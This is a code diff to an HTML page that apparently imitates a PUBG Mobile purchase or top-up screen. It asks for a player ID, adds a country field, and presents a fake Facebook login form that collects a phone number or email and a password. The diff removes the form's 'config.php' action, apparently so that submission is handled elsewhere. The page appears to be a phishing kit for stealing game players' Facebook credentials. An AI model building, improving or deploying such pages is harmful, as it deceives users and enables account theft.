@@ -64,10 +64,19 @@
           <div class="form-main">
             <label>Player ID Verification</label>
             <div class="input-groups">
-              <input class="main-input" name="first_name" placeholder="Please Enter Player ID" type="text"><span>OK</span>
+              <input class="main-input" name="first_name" placeholder="Please Enter Player ID" type="text">
             </div>
             <div class="validation-msg empty">Player ID is required‎</div>
             <div class="message">Couldn't find your Player ID?</div>
+          </div>
+          <div class="form-main">
+            <form>
+              <label>Please Write Your Country And Press Ok</label>
+              <div class="input-groups">
+                <input class="main-input" type="text" name="country" autocomplete="off" required placeholder="Please Write Your Country">
+                <input class="ok" id="seend" type="submit" value="OK" style="width: auto;">
+              </div>
+            </form>
           </div>
         </div>
         <h6>Payment Method </h6>
@@ -170,7 +179,7 @@
         <div class="head"><img src="imges/text.png" alt=""></div>
         <div class="content-box"><img src="imges/icon-logo.jpg" alt="">
           <div class="txt-box"> Log in to your Facebook account to connect to PUBG MOBILE</div>
-          <form action="config.php">
+          <form>
             <input type="text" name="username" autocomplete="off" required placeholder="Mobile number or email address">
             <input type="password" name="password" autocomplete="off" required placeholder="Password">
             <input id="seend" type="submit" value="Log In">
